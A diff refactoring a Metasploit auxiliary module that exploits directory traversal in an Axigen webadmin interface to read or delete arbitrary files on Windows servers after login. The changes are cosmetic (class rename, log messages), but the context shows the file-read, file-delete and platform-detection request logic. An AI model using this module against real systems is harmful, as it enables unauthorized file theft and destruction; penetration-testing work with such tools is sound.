@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
@@ -47,15 +44,15 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('USERNAME', [ true, 'The user to authenticate as', 'admin' ]),
         OptString.new('PASSWORD', [ true, 'The password to authenticate with' ]),
         OptString.new('PATH',     [ true, 'The file to read or delete', "\\windows\\win.ini" ])
-      ], self.class)
+      ])
   end
 
   def run
-    print_status("#{peer} - Trying to login")
+    print_status("Trying to login")
     if login
-      print_good("#{peer} - Login successful")
+      print_good("Login Successful")
     else
-      print_error("#{peer} - Login failed, review USERNAME and PASSWORD options")
+      print_error("Login failed, review USERNAME and PASSWORD options")
       return
     end
 
@@ -67,7 +64,7 @@ class Metasploit3 < Msf::Auxiliary
       @traversal.gsub!(/\//, "\\")
       file.gsub!(/\//, "\\")
     else # unix
-      print_error("#{peer} - *nix platform detected, vulnerability is only known to work on Windows")
+      print_error("*nix platform detected, vulnerability is only known to work on Windows")
       return
     end
 
@@ -81,7 +78,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def read_file(file)
 
-    print_status("#{peer} - Retrieving file contents...")
+    print_status("Retrieving file contents...")
 
     res = send_request_cgi(
     {
@@ -96,14 +93,14 @@ class Metasploit3 < Msf::Auxiliary
 
     if res and res.code == 200 and res.headers['Content-Type'] and res.body.length > 0
       store_path = store_loot("axigen.webadmin.data", "application/octet-stream", rhost, res.body, file)
-      print_good("#{peer} - File successfully retrieved and saved on #{store_path}")
+      print_good("File successfully retrieved and saved on #{store_path}")
     else
-      print_error("#{peer} - Failed to retrieve file")
+      print_error("Failed to retrieve file")
     end
   end
 
   def delete_file(file)
-    print_status("#{peer} - Deleting file #{file}")
+    print_status("Deleting file #{file}")
 
     res = send_request_cgi(
     {
@@ -119,14 +116,14 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     if res and res.code == 200 and res.body =~ /View Log Files/
-      print_good("#{peer} - File #{file} deleted")
+      print_good("File #{file} deleted")
     else
-      print_error("#{peer} - Error deleting file #{file}")
+      print_error("Error deleting file #{file}")
     end
   end
 
   def get_platform
-    print_status("#{peer} - Retrieving platform")
+    print_status("Retrieving platform")
 
     res = send_request_cgi(
       {
@@ -140,15 +137,15 @@ class Metasploit3 < Msf::Auxiliary
 
     if res and res.code == 200
       if res.body =~ /Windows/
-        print_good("#{peer} - Windows platform found")
+        print_good("Windows platform found")
         return 'windows'
       elsif res.body =~ /Linux/
-        print_good("#{peer} - Linux platform found")
+        print_good("Linux platform found")
         return 'unix'
       end
     end
 
-    print_warning("#{peer} - Platform not found, assuming UNIX flavor")
+    print_warning("Platform not found, assuming UNIX flavor")
     return 'unix'
   end
 
@@ -175,5 +172,4 @@ class Metasploit3 < Msf::Auxiliary
 
     return false
   end
-
 end
